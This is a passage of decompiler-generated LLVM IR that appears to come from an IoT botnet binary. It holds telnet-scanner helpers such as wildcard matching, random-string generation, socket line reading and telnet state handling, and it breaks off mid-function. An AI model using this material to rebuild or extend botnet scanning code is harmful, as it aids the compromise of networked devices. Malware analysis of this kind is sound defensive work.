  %v4_8048cda = icmp eq i8 %v2_8048cd8, 0
  br i1 %v4_8048cda, label %dec_label_pc_8048ce4, label %dec_label_pc_8048cde

dec_label_pc_8048cde:                             ; preds = %entry, %dec_label_pc_8048cb4
  %v4_8048cd513 = phi i32 [ %v5_8048cd2, %dec_label_pc_8048cb4 ], [ %v4_8048cd55, %entry ]
  %stack_var_4.012 = phi i8* [ %v22_8048cd2, %dec_label_pc_8048cb4 ], [ %arg1, %entry ]
  %stack_var_-8.011 = phi i32 [ %v2_8048ccd, %dec_label_pc_8048cb4 ], [ 0, %entry ]
  %v5_8048cde = icmp slt i32 %stack_var_-8.011, 0
  %v1_8048ce2 = icmp eq i1 %v5_8048cde, false
  br i1 %v1_8048ce2, label %dec_label_pc_8048cb4, label %dec_label_pc_8048ce4

dec_label_pc_8048ce4:                             ; preds = %dec_label_pc_8048cb4, %dec_label_pc_8048cde, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-8.011, %dec_label_pc_8048cde ], [ %v2_8048ccd, %dec_label_pc_8048cb4 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.011, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048ce4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048cde, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp14 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048cec = load i32, i32* @ebx, align 4
  store i32 %v0_8048cec, i32* %stack_var_-8, align 4
  %v4_8048cf0 = ptrtoint i8* %arg1 to i32
  %v2_8048cf3 = load i8, i8* %arg1, align 1
  %v12_8048cff = icmp eq i8 %v2_8048cf3, 42
  br i1 %v12_8048cff, label %dec_label_pc_8048d2a, label %dec_label_pc_8048d05

dec_label_pc_8048d05:                             ; preds = %entry
  %v12_8048d05 = icmp eq i8 %v2_8048cf3, 63
  br i1 %v12_8048d05, label %dec_label_pc_8048d7c, label %dec_label_pc_8048d0b

dec_label_pc_8048d0b:                             ; preds = %dec_label_pc_8048d05
  %v4_8048d0b = icmp eq i8 %v2_8048cf3, 0
  br i1 %v4_8048d0b, label %dec_label_pc_8048d16, label %dec_label_pc_8048db6

dec_label_pc_8048d16:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048d19 = load i8, i8* %tmp14, align 1
  %v3_8048d19 = zext i8 %v2_8048d19 to i32
  br label %dec_label_pc_8048e17

dec_label_pc_8048d2a:                             ; preds = %entry
  %v1_8048d2d = add i32 %v4_8048cf0, 1
  %v5_8048d34 = inttoptr i32 %v1_8048d2d to i8*
  %v5_8048d35 = call i32 @wildString(i8* %v5_8048d34, i32 %arg2)
  %v1_8048d3d = icmp eq i32 %v5_8048d35, 0
  br i1 %v1_8048d3d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d41

dec_label_pc_8048d41:                             ; preds = %dec_label_pc_8048d2a
  %v2_8048d44 = load i8, i8* %tmp14, align 1
  %v4_8048d46 = icmp eq i8 %v2_8048d44, 0
  br i1 %v4_8048d46, label %dec_label_pc_8048d71, label %dec_label_pc_8048d4a

dec_label_pc_8048d4a:                             ; preds = %dec_label_pc_8048d41
  %v1_8048d4d = add i32 %arg2, 1
  %v5_8048d55 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048d4d)
  %v1_8048d5d = icmp eq i32 %v5_8048d55, 0
  br i1 %v1_8048d5d, label %dec_label_pc_8048d6a, label %dec_label_pc_8048d71

dec_label_pc_8048d6a:                             ; preds = %dec_label_pc_8048d4a, %dec_label_pc_8048d2a
  br label %dec_label_pc_8048d71

dec_label_pc_8048d71:                             ; preds = %dec_label_pc_8048d41, %dec_label_pc_8048d4a, %dec_label_pc_8048d6a
  %storemerge8 = phi i32 [ 0, %dec_label_pc_8048d6a ], [ 1, %dec_label_pc_8048d4a ], [ 1, %dec_label_pc_8048d41 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048d7c:                             ; preds = %dec_label_pc_8048d05
  %v2_8048d7f = load i8, i8* %tmp14, align 1
  %v4_8048d81 = icmp eq i8 %v2_8048d7f, 0
  br i1 %v4_8048d81, label %dec_label_pc_8048dae, label %dec_label_pc_8048d85

dec_label_pc_8048d85:                             ; preds = %dec_label_pc_8048d7c
  %v1_8048d88 = add i32 %arg2, 1
  %v1_8048d8c = add i32 %v4_8048cf0, 1
  %v5_8048d91 = inttoptr i32 %v1_8048d8c to i8*
  %v5_8048d92 = call i32 @wildString(i8* %v5_8048d91, i32 %v1_8048d88)
  %v1_8048d9a = icmp ne i32 %v5_8048d92, 0
  %. = zext i1 %v1_8048d9a to i32
  br label %dec_label_pc_8048dae

dec_label_pc_8048dae:                             ; preds = %dec_label_pc_8048d85, %dec_label_pc_8048d7c
  %storemerge5 = phi i32 [ 1, %dec_label_pc_8048d7c ], [ %., %dec_label_pc_8048d85 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048db6:                             ; preds = %dec_label_pc_8048d0b
  %v2_8048db9 = load i8, i8* %arg1, align 1
  %v3_8048db9 = zext i8 %v2_8048db9 to i32
  %v2_8048dc4 = call i32 @__GI_toupper(i32 %v3_8048db9)
  store i32 %v2_8048dc4, i32* @ebx, align 4
  %v2_8048dd1 = load i8, i8* %tmp14, align 1
  %v3_8048dd1 = zext i8 %v2_8048dd1 to i32
  %v2_8048ddc = call i32 @__GI_toupper(i32 %v3_8048dd1)
  %v0_8048de4 = load i32, i32* @ebx, align 4
  %v12_8048de4 = icmp eq i32 %v0_8048de4, %v2_8048ddc
  %v1_8048de6 = icmp eq i1 %v12_8048de4, false
  br i1 %v1_8048de6, label %dec_label_pc_8048e11, label %dec_label_pc_8048de8

dec_label_pc_8048de8:                             ; preds = %dec_label_pc_8048db6
  %v1_8048deb = add i32 %arg2, 1
  %v1_8048def = add i32 %v4_8048cf0, 1
  %v5_8048df4 = inttoptr i32 %v1_8048def to i8*
  %v5_8048df5 = call i32 @wildString(i8* %v5_8048df4, i32 %v1_8048deb)
  %v1_8048dfd = icmp ne i32 %v5_8048df5, 0
  %.9 = zext i1 %v1_8048dfd to i32
  br label %dec_label_pc_8048e11

dec_label_pc_8048e11:                             ; preds = %dec_label_pc_8048de8, %dec_label_pc_8048db6
  %storemerge = phi i32 [ 1, %dec_label_pc_8048db6 ], [ %.9, %dec_label_pc_8048de8 ]
  br label %dec_label_pc_8048e17

dec_label_pc_8048e17:                             ; preds = %dec_label_pc_8048dae, %dec_label_pc_8048d71, %dec_label_pc_8048d16, %dec_label_pc_8048e11
  %stack_var_-24.0 = phi i32 [ %storemerge8, %dec_label_pc_8048d71 ], [ %storemerge5, %dec_label_pc_8048dae ], [ %v3_8048d19, %dec_label_pc_8048d16 ], [ %storemerge, %dec_label_pc_8048e11 ]
  %v3_8048e1a = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8048e1a, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048cf3, { 2, 0, 1 }
  uselistorder i32 %v4_8048cf0, { 0, 2, 1 }
  uselistorder i8* %tmp14, { 3, 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8048e17, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048d71, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8048e2c = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048e2c, i32* %arg2, align 4
  %v10_8048e40 = icmp eq i32 %v1_8048e2c, -1
  %. = zext i1 %v10_8048e40 to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048e826 = ptrtoint i8* %arg1 to i32
  %v2_8048e857 = load i8, i8* %arg1, align 1
  %v3_8048e858 = zext i8 %v2_8048e857 to i32
  %v5_8048e859 = and i32 %v4_8048e826, -256
  %v6_8048e8510 = or i32 %v3_8048e858, %v5_8048e859
  %v4_8048e8711 = icmp eq i8 %v2_8048e857, 0
  %v1_8048e8912 = icmp eq i1 %v4_8048e8711, false
  br i1 %v1_8048e8912, label %dec_label_pc_8048e62, label %dec_label_pc_8048e8b

dec_label_pc_8048e62:                             ; preds = %entry, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge
  %v4_8048e8214 = phi i32 [ %v5_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %v4_8048e826, %entry ]
  %stack_var_4.013 = phi i8* [ %v22_8048e7f, %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge ], [ %arg1, %entry ]
  %v2_8048e65 = load i8, i8* %stack_var_4.013, align 1
  %v3_8048e65 = zext i8 %v2_8048e65 to i32
  %v1_8048e70 = call i32 @__GI_toupper(i32 %v3_8048e65)
  %v1_8048e7d = trunc i32 %v1_8048e70 to i8
  store i8 %v1_8048e7d, i8* %stack_var_4.013, align 1
  %v5_8048e7f = add i32 %v4_8048e8214, 1
  %v22_8048e7f = inttoptr i32 %v5_8048e7f to i8*
  %v2_8048e85 = load i8, i8* %v22_8048e7f, align 1
  %v4_8048e87 = icmp eq i8 %v2_8048e85, 0
  %v1_8048e89 = icmp eq i1 %v4_8048e87, false
  br i1 %v1_8048e89, label %dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge, label %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge

dec_label_pc_8048e62.dec_label_pc_8048e62_crit_edge: ; preds = %dec_label_pc_8048e62
  br label %dec_label_pc_8048e62

dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge: ; preds = %dec_label_pc_8048e62
  %v3_8048e85 = zext i8 %v2_8048e85 to i32
  %v5_8048e85 = and i32 %v5_8048e7f, -256
  %v6_8048e85 = or i32 %v3_8048e85, %v5_8048e85
  br label %dec_label_pc_8048e8b

dec_label_pc_8048e8b:                             ; preds = %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge, %entry
  %v6_8048e85.lcssa = phi i32 [ %v6_8048e85, %dec_label_pc_8048e82.dec_label_pc_8048e8b_crit_edge ], [ %v6_8048e8510, %entry ]
  ret i32 %v6_8048e85.lcssa

; uselistorder directives
  uselistorder i8 %v2_8048e85, { 1, 0 }
  uselistorder i8* %v22_8048e7f, { 1, 0 }
  uselistorder i32 %v5_8048e7f, { 1, 2, 0 }
  uselistorder i8* %stack_var_4.013, { 1, 0 }
  uselistorder label %dec_label_pc_8048e62, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048e8d = load i32, i32* @ebp, align 4
  store i32 %v0_8048e8d, i32* %stack_var_-4, align 4
  %v0_8048e91 = load i32, i32* @ebx, align 4
  store i32 %v0_8048e91, i32* %stack_var_-12, align 4
  %v5_8048eaa = ptrtoint i8* %arg1 to i32
  %v5_8048eeb21 = icmp sgt i32 %arg2, 0
  br i1 %v5_8048eeb21, label %dec_label_pc_8048ea5, label %dec_label_pc_8048eed

dec_label_pc_8048ea5:                             ; preds = %entry, %dec_label_pc_8048ea5
  %storemerge22 = phi i32 [ %v4_8048ee2, %dec_label_pc_8048ea5 ], [ 0, %entry ]
  %v6_8048eaa = add i32 %storemerge22, %v5_8048eaa
  store i32 %v6_8048eaa, i32* @ebx, align 4
  %v1_8048ead = call i32 @rand_cmwc(i32 %storemerge22)
  store i32 %v1_8048ead, i32* @ecx, align 4
  %v2_8048ebd = udiv i32 %v1_8048ead, 26
  %tmp = mul i32 %v2_8048ebd, -10
  %v2_8048ed5 = add i32 %v1_8048ead, %tmp
  %v1_8048edd = add i32 %v2_8048ed5, 65
  %v11_8048edd = trunc i32 %v1_8048edd to i8
  %v2_8048ee0 = load i32, i32* @ebx, align 4
  %v3_8048ee0 = inttoptr i32 %v2_8048ee0 to i8*
  store i8 %v11_8048edd, i8* %v3_8048ee0, align 1
  %v4_8048ee2 = add nuw nsw i32 %storemerge22, 1
  %exitcond = icmp eq i32 %v4_8048ee2, %arg2
  br i1 %exitcond, label %dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge, label %dec_label_pc_8048ea5

dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge: ; preds = %dec_label_pc_8048ea5
  %v2_8048ef0.pre = load i32, i32* %stack_var_-12, align 4
  %v2_8048ef2.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048eed

dec_label_pc_8048eed:                             ; preds = %dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge, %entry
  %v2_8048ef2 = phi i32 [ %v2_8048ef2.pre, %dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge ], [ %v0_8048e8d, %entry ]
  %v2_8048ef0 = phi i32 [ %v2_8048ef0.pre, %dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge ], [ %v0_8048e91, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_8048ee5.dec_label_pc_8048eed_crit_edge ], [ 0, %entry ]
  store i32 %v2_8048ef0, i32* @ebx, align 4
  store i32 %v2_8048ef2, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048ee2, { 1, 0 }
  uselistorder i32 %storemerge22, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048ea5, { 1, 0 }
}

define i32 @recvLine() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048ef7 = load i32, i32* @edi, align 4
  store i32 %v0_8048ef7, i32* %stack_var_-8, align 4
  %v1_8048f04 = inttoptr i32 %tmp17 to i8*
  %v1_8048f09 = and i32 %tmp17, -256
  store i32 %v1_8048f09, i32* %eax.global-to-local, align 4
  %v5_8048f0b = call i8* @_memset(i8* %v1_8048f04, i32 %v1_8048f09, i32 %tmp18)
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8048f2b = ptrtoint i32* %stack_var_-168 to i32
  %tmp34 = bitcast i32* %stack_var_-168 to i8*
  store i1 false, i1* @df, align 1
  %v5_8048f32 = call i8* @_memset(i8* %tmp34, i32 0, i32 32)
  %v2_8048f3f = udiv i32 %tmp13, 32
  %v1_8048f45 = urem i32 %tmp13, 32
  store i32 %v1_8048f45, i32* %eax.global-to-local, align 4
  %v0_8048f48 = load i32, i32* @ebp, align 4
  %v2_8048f48 = mul nuw nsw i32 %v2_8048f3f, 4
  %v3_8048f48 = add nsw i32 %v2_8048f48, -164
  %v4_8048f48 = add i32 %v3_8048f48, %v0_8048f48
  %v5_8048f48 = inttoptr i32 %v4_8048f48 to i32*
  %v6_8048f48 = load i32, i32* %v5_8048f48, align 4
  %v9_8048f48 = shl i32 1, %v1_8048f45
  %v12_8048f48 = or i32 %v6_8048f48, %v9_8048f48
  store i32 %v12_8048f48, i32* %v5_8048f48, align 4
  %v1_8048f53 = add i32 %tmp13, 1
  %v2_8048f57 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_8048f2b, i32* %eax.global-to-local, align 4
  %v5_8048f6f = call i32 @__libc_select(i32 %v1_8048f53, i32 %v2_8048f2b, i32 0, i32 %v2_8048f2b, i32 %v2_8048f57)
  store i32 %v5_8048f6f, i32* %eax.global-to-local, align 4
  %tmp35 = icmp slt i32 %v5_8048f6f, 1
  %tmp36 = icmp eq i1 %tmp35, false
  br i1 %tmp36, label %dec_label_pc_8048ffe, label %dec_label_pc_8048ff8.preheader

dec_label_pc_8048ff8.preheader:                   ; preds = %entry
  %v7_8048ffc43 = icmp sgt i32 %tmp9, 9
  br i1 %v7_8048ffc43, label %dec_label_pc_8048ffe, label %dec_label_pc_8048f82

dec_label_pc_8048f82:                             ; preds = %dec_label_pc_8048ff8.preheader, %dec_label_pc_8048ff5
  %stack_var_-36.044 = phi i32 [ %v4_8048ff5, %dec_label_pc_8048ff5 ], [ %tmp9, %dec_label_pc_8048ff8.preheader ]
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v5_8048fa7 = call i8* @_memset(i8* %tmp34, i32 0, i32 32)
  store i32 %v1_8048f45, i32* %eax.global-to-local, align 4
  %v0_8048fbd = load i32, i32* @ebp, align 4
  %v4_8048fbd = add i32 %v3_8048f48, %v0_8048fbd
  %v5_8048fbd = inttoptr i32 %v4_8048fbd to i32*
  %v6_8048fbd = load i32, i32* %v5_8048fbd, align 4
  %v12_8048fbd = or i32 %v6_8048fbd, %v9_8048f48
  store i32 %v12_8048fbd, i32* %v5_8048fbd, align 4
  store i32 %v2_8048f2b, i32* %eax.global-to-local, align 4
  %v5_8048fe4 = call i32 @__libc_select(i32 %v1_8048f53, i32 %v2_8048f2b, i32 0, i32 %v2_8048f2b, i32 %v2_8048f57)
  store i32 %v5_8048fe4, i32* %eax.global-to-local, align 4
  %tmp37 = icmp slt i32 %v5_8048fe4, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8048ffe, label %dec_label_pc_8048ff5

dec_label_pc_8048ff5:                             ; preds = %dec_label_pc_8048f82
  %v4_8048ff5 = add nsw i32 %stack_var_-36.044, 1
  %v7_8048ffc = icmp sgt i32 %stack_var_-36.044, 8
  br i1 %v7_8048ffc, label %dec_label_pc_8048ffe, label %dec_label_pc_8048f82

dec_label_pc_8048ffe:                             ; preds = %dec_label_pc_8048ff8.preheader, %dec_label_pc_8048f82, %dec_label_pc_8048ff5, %entry
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v2_8049016 = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_8049058

dec_label_pc_804900d:                             ; preds = %dec_label_pc_8049058
  %v0_804900d = load i32, i32* @global_var_80584c0.18, align 64
  store i32 %v0_804900d, i32* %eax.global-to-local, align 4
  %v4_804901e = call i32 @__libc_recv(i32 %v0_804900d, i32 %v2_8049016, i32 1, i32 0)
  store i32 %v4_804901e, i32* %eax.global-to-local, align 4
  %v9_8049026 = icmp eq i32 %v4_804901e, 1
  br i1 %v9_8049026, label %dec_label_pc_804903d, label %dec_label_pc_804902b

dec_label_pc_804902b:                             ; preds = %dec_label_pc_804900d
  %v4_804902b = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 %v4_804902b, i32* %eax.global-to-local, align 4
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_8049075

dec_label_pc_804903d:                             ; preds = %dec_label_pc_804900d
  %v3_804903d = load i8, i8* %stack_var_-177, align 1
  %v4_804903d = sext i8 %v3_804903d to i32
  store i32 %v4_804903d, i32* %eax.global-to-local, align 4
  %v4_8049043 = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_804903d, i8* %stack_var_-32.0, align 1
  %v5_8049048 = add i32 %v4_8049043, 1
  %v22_8049048 = inttoptr i32 %v5_8049048 to i8*
  %v3_804904b = load i8, i8* %stack_var_-177, align 1
  %v4_804904b = sext i8 %v3_804904b to i32
  %v6_804904b = load i32, i32* %eax.global-to-local, align 4
  %v7_804904b = and i32 %v6_804904b, -256
  %v8_804904b = or i32 %v7_804904b, %v4_804904b
  store i32 %v8_804904b, i32* %eax.global-to-local, align 4
  %v10_8049051 = icmp eq i8 %v3_804904b, 10
  br i1 %v10_8049051, label %dec_label_pc_8049066, label %dec_label_pc_8049055

dec_label_pc_8049055:                             ; preds = %dec_label_pc_804903d
  %v4_8049055 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8049058

dec_label_pc_8049058:                             ; preds = %dec_label_pc_8048ffe, %dec_label_pc_8049055
  %v7_804905c = phi i32 [ %tmp17, %dec_label_pc_8048ffe ], [ %v8_804904b, %dec_label_pc_8049055 ]
  %stack_var_-32.0 = phi i8* [ %v1_8048f04, %dec_label_pc_8048ffe ], [ %v22_8049048, %dec_label_pc_8049055 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048ffe ], [ %v4_8049055, %dec_label_pc_8049055 ]
  %stack_var_12.0 = phi i32 [ %tmp18, %dec_label_pc_8048ffe ], [ %v4_8049058, %dec_label_pc_8049055 ]
  %v4_8049058 = add i32 %stack_var_12.0, -1
  %v9_8049058 = sub i32 0, %stack_var_12.0
  %v10_8049058 = and i32 %stack_var_12.0, %v9_8049058
  %v11_8049058 = icmp slt i32 %v10_8049058, 0
  %v12_8049058 = icmp eq i32 %v4_8049058, 0
  %v13_8049058 = icmp slt i32 %v4_8049058, 0
  %v3_804905c = icmp eq i1 %v13_8049058, %v11_8049058
  %v4_804905c = icmp eq i1 %v12_8049058, false
  %v5_804905c = and i1 %v4_804905c, %v3_804905c
  %v6_804905c = zext i1 %v5_804905c to i32
  %v8_804905c = and i32 %v7_804905c, -256
  %v9_804905c = or i32 %v6_804905c, %v8_804905c
  store i32 %v9_804905c, i32* %eax.global-to-local, align 4
  %v4_8049062 = icmp eq i1 %v5_804905c, false
  %v1_8049064 = icmp eq i1 %v4_8049062, false
  br i1 %v1_8049064, label %dec_label_pc_804900d, label %dec_label_pc_8049066

dec_label_pc_8049066:                             ; preds = %dec_label_pc_804903d, %dec_label_pc_8049058
  %stack_var_-32.1 = phi i8* [ %v22_8049048, %dec_label_pc_804903d ], [ %stack_var_-32.0, %dec_label_pc_8049058 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  store i32 %stack_var_-28.0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049075

dec_label_pc_8049075:                             ; preds = %dec_label_pc_804902b, %dec_label_pc_8049066
  %storemerge = phi i32 [ -1, %dec_label_pc_804902b ], [ %stack_var_-28.0, %dec_label_pc_8049066 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v3_804907b = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804907b, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049058, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-28.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 2, 0, 1, 3, 4 }
  uselistorder i8* %v22_8049048, { 1, 0 }
  uselistorder i32 %v1_8048f45, { 2, 1, 0 }
  uselistorder i32 %v2_8048f2b, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 3, 1, 2 }
  uselistorder i32 %tmp13, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder label %dec_label_pc_8049075, { 1, 0 }
  uselistorder label %dec_label_pc_8049066, { 1, 0 }
  uselistorder label %dec_label_pc_8049058, { 1, 0 }
  uselistorder label %dec_label_pc_8048ffe, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8048f82, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v1_8049089 = add i32 %tmp1, 4
  %v2_8049089 = inttoptr i32 %v1_8049089 to i32*
  %v3_8049089 = load i32, i32* %v2_8049089, align 4
  %v1_8049095 = call i32 @__GI_inet_ntoa(i32 %v3_8049089)
  ret i32 %v1_8049095
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80490a2 = load i32, i32* @edi, align 4
  store i32 %v0_80490a2, i32* %stack_var_-8, align 4
  %v1_80490ac = inttoptr i32 %tmp4 to i8*
  store i32 %tmp4, i32* @edi, align 4
  %v1_80490b1 = and i32 %tmp4, -256
  %v5_80490b3 = call i8* @_memset(i8* %v1_80490ac, i32 %v1_80490b1, i32 %tmp5)
  %v4_80490c1 = call i32 @read_with_timeout(i32 %arg1, i32 %tmp3, i32 %tmp4, i32 %tmp5)
  %v2_80490d5 = inttoptr i32 %tmp to i32*
  %v3_80490d5 = call i32 @contains_string(i32 %tmp4, i32* %v2_80490d5)
  %v1_80490dd = icmp ne i32 %v3_80490d5, 0
  %storemerge = zext i1 %v1_80490dd to i32
  %v3_80490f4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80490f4, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp4, { 4, 0, 1, 3, 2 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_8049120 = ptrtoint i32* %stack_var_-144 to i32
  %tmp21 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_8049127 = call i8* @_memset(i8* %tmp21, i32 0, i32 32)
  %v2_8049134 = udiv i32 %arg1, 32
  %v1_804913a = urem i32 %arg1, 32
  %v0_804913d = load i32, i32* @ebp, align 4
  %v2_804913d = mul nuw nsw i32 %v2_8049134, 4
  %v3_804913d = add nsw i32 %v2_804913d, -140
  %v4_804913d = add i32 %v3_804913d, %v0_804913d
  %v5_804913d = inttoptr i32 %v4_804913d to i32*
  %v6_804913d = load i32, i32* %v5_804913d, align 4
  %v9_804913d = shl i32 1, %v1_804913a
  %v12_804913d = or i32 %v6_804913d, %v9_804913d
  store i32 %v12_804913d, i32* %v5_804913d, align 4
  %v1_8049148 = add i32 %arg1, 1
  %v2_804914c = ptrtoint i32* %stack_var_-152 to i32
  %v5_804915f = call i32 @__libc_select(i32 %v1_8049148, i32 %v2_8049120, i32 0, i32 0, i32 %v2_804914c)
  %tmp22 = icmp slt i32 %v5_804915f, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_8049177, label %dec_label_pc_8049191

dec_label_pc_8049177:                             ; preds = %entry
  %v4_8049183 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_8049191

dec_label_pc_8049191:                             ; preds = %entry, %dec_label_pc_8049177
  %storemerge = phi i32 [ %v4_8049183, %dec_label_pc_8049177 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049191, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp2 = ptrtoint i32* %arg1 to i32
  %v4_80491a2 = icmp eq i32 %arg2, 0
  %v6_80491a2 = trunc i32 %arg2 to i8
  %v1_80491a6 = icmp eq i1 %v4_80491a2, false
  br i1 %v1_80491a6, label %entry.dec_label_pc_80491b9_crit_edge, label %dec_label_pc_80491a8

entry.dec_label_pc_80491b9_crit_edge:             ; preds = %entry
  br label %dec_label_pc_80491b9

dec_label_pc_80491a8:                             ; preds = %entry
  %v2_80491ab = load i32, i32* %arg1, align 4
  %v1_80491b1 = call i32 @__libc_close(i32 %v2_80491ab)
  br label %dec_label_pc_80491b9

dec_label_pc_80491b9:                             ; preds = %entry.dec_label_pc_80491b9_crit_edge, %dec_label_pc_80491a8
  %v1_80491bc = add i32 %tmp2, 16
  %v2_80491bc = inttoptr i32 %v1_80491bc to i32*
  store i32 0, i32* %v2_80491bc, align 4
  %v3_80491cb = add i32 %tmp2, 8
  %v4_80491cb = inttoptr i32 %v3_80491cb to i8*
  store i8 %v6_80491a2, i8* %v4_80491cb, align 1
  %v1_80491d1 = add i32 %tmp2, 24
  %v2_80491d1 = inttoptr i32 %v1_80491d1 to i32*
  %v3_80491d1 = load i32, i32* %v2_80491d1, align 4
  %v3_80491e2 = inttoptr i32 %v3_80491d1 to i8*
  %v4_80491e2 = call i32 @__GI_memset(i8* %v3_80491e2, i32 0, i32 1024)
  ret i32 %v4_80491e2

; uselistorder directives
  uselistorder i32 %tmp2, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80491b9, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1) local_unnamed_addr {
entry:
  %v2_80491fa = inttoptr i32 %arg1 to i32*
  %v3_80491fa = call i32 @advance_state(i32* %v2_80491fa, i32 0)
  %v1_8049205 = add i32 %arg1, 9
  %v2_8049205 = inttoptr i32 %v1_8049205 to i8*
  store i8 1, i8* %v2_8049205, align 1
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v4_804921c = call i32 @contains_string(i32 %arg1, i32* bitcast ([3 x i8*]* @global_var_80581c0.22 to i32*))
